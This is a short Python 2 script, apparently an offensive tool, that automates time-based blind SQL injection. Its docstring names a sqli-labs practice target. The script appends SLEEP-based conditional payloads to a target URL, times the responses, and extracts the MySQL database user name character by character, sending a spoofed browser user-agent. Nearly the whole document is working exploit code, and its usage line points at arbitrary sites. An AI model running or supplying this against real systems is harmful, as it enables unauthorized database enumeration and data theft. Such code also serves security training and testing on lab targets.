#!/usr/bin/env python
# encoding:utf-8
import time
import requests
import sys

__author__ = "whois"
__date__   = "2016/10/1"

""" 
    http://10.10.10.100/sqli-labs/Less-8/?id=1'+and+if(now()=sysdate(),SLEEP(IF(ascii(mid(user(),1,1))=116,10,0)),0)
    http://xxx.com/1.php?id=if()...
"""

if len(sys.argv) < 2:
    print "Usage: sql-time target time(default 6)"
    print "ex: sql-time.py http://xxx.com/1.php?id=5"
    exit(1)

my_time = int(sys.argv[2]) if len(sys.argv)==3 else 6
url = sys.argv[1]
headers = {'user-agent':'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04'}

payloads = '0123456789abcdefghijklmnopqrstuvwxyz@_-.'
user = ''

for num in xrange(1,15):
    for p in payloads:
        s = "if(now()=sysdate(),SLEEP(IF(ascii(mid(user(),{0},1))={1},{2},0)),0)--+".format(num,ord(p),my_time)
        start_time = time.time()
        try:
            r = requests.get(url+s,headers=headers)
        except:
            print "[-] Some error"
            exit(1)
        if time.time() - start_time > my_time:
            user += p
            sys.stdout.write('\r'+user)
            break

print "\n[+] MySQL User is {0}".format(user)
